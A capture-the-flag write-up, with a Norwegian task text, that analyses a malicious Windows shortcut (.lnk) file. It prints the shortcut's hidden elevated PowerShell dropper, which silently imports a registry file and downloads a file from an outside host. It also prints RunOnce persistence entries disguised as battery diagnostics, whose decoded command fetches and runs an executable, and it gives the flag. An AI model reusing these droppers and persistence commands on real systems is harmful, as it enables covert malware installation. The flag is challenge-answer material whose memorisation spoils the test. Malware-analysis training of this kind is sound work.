# En snarvei

Maldocs som i dokumenter finnes fortsatt, men mindre enn før. Nå er det snarveifiler som er det nye kule.
Dette er et modifisert (ekte) maldoc. Det som gjør det farlig er fjernet, men AV kan fortsatt være mindre imponert. Den er derfor pakket inn i en zipfil med passord ´infected´.
Jobb med den som et ekte maldoc. Lykke til

[⬇️ maldoc_oppgave.7z](./maldoc_oppgave.7z)

# Writeup

Unpacked the 7z file opened the lnk in a text editor. Copied the content to Cyberchef and "removed null bytes" to see more readable text. Some manual cleanup and I see the malicious data:

```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "& {$currentPath = (Get-Location).Path; Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList ('-Command Set-Location -Path ''\"' + $currentPath + '\"'' ;$dirPath = Get-Location;Set-Location -Path ''\"' + $dirPath.Path + '\"'' ;$lnkpaths = Get-ChildItem -Path ''\"' + $dirPath.Path + '\"'' -Recurse *.lnk | Where-Object { $_.length -eq 423781 } | Select-Object -ExpandProperty FullName;$lnkpath = if ($lnkpaths -is [array]) {$lnkpaths[0]} else {$lnkpaths};$exeFile = Get-Content $lnkpath -Encoding Byte -TotalCount 423781 -ReadCount 423781;$exePath = Join-Path $env:public ''17399.reg'';Set-Content $exePath ([byte[]]($exeFile | Select-Object -Skip 4901)) -Encoding Byte;Start-Process -FilePath ''regedit'' -ArgumentList ''/s'', $exePath;$a=''http://files.catbox.moe/p1yr9i.pdf'';$d=$env:TEMP + ''\Document.pdf'';Invoke-WebRequest -Uri $a -OutFile $d; Invoke-Item $d')}"<C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

Looks like it searches for .lnk files where object length is 423781 bytes, then reads them and writes it to a new file named 17399.reg but it skips the first 4901 bytes. Then run `regedit /s 17399.reg` and downloads a pdf from `http://files.catbox.moe/p1yr9i.pdf` and opens it. 

The PDF looks harmless, I'm more interested in what is in 17399.reg.

```bash
dd if=snarvei.pdf.lnk of=17399.reg bs=1 skip=4091
```

Now running `strings 17399.reg | grep HKEY -A 1` on this to see keys we get two:

```
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
"BatteryDiagnosticHelper"="powershell -W Hidden -e JABjAHUAcgByAGUAbgB0AEQAcgBpAHYAZQAgAD0AIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACAAfAAgAFMAcABsAGkAdAAtAFAAYQB0AGgAIAAtAFEAdQBhAGwAaQBmAGkAZQByACkAOwAgAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAkAGMAdQByAHIAZQBuAHQARAByAGkAdgBlAFwA"
--
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
"BatteryDiagnosticTool"="powershell -W Hidden -e JABhAD0AJwBoAHQAdABwADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AcgBlAGQAYQBjAHQAZQBkACcAOwAkAGIAPQAnAGgAZQBsAHMAZQBjAHQAZgB7AGwAbgBrAF8AegBlAF8AbgBlAHcAXwBtAGEAbABkAG8AYwB9ACcAOwAkAGQAPQAiACQAKAAkAGUAbgB2ADoAVABFAE0AUAApAFwAQgBhAHQAdABlAHIAeQBEAGkAYQBnAG4AbwBzAHQAaQBjACIAOwBpAGYAKAAtAG4AbwB0ACgAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAkAGQAIAAtAFAAYQB0AGgAVAB5AHAAZQAgAEMAbwBuAHQAYQBpAG4AZQByACkAKQB7AE4AZQB3AC0ASQB0AGUAbQAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAtAFAAYQB0AGgAIAAkAGQAfQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMAMAA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGEAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZABcAEIAYQB0AHQAZQByAHkARABpAGEAZwBuAG8AcwB0AGkAYwBUAG8AbwBsAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBJAHQAZQBtACAAIgAkAGQAXABCAGEAdAB0AGUAcgB5AEQAaQBhAGcAbgBvAHMAdABpAGMAVABvAG8AbAAuAGUAeABlACIA"
```

Running the last one into cyberchef, from base64 and remove null bytes we get:

```
$a='http://raw.githubusercontent.redacted';$b='helsectf{lnk_ze_new_maldoc}';$d="$($env:TEMP)\BatteryDiagnostic";if(-not(Test-Path -Path $d -PathType Container)){New-Item -ItemType Directory -Path $d};Start-Sleep -Seconds 30;Invoke-WebRequest -Uri $a -OutFile "$d\BatteryDiagnosticTool.exe"; Invoke-Item "$d\BatteryDiagnosticTool.exe"
``` 

Flag aquired :)

# Flag

```
helsectf{lnk_ze_new_maldoc}
```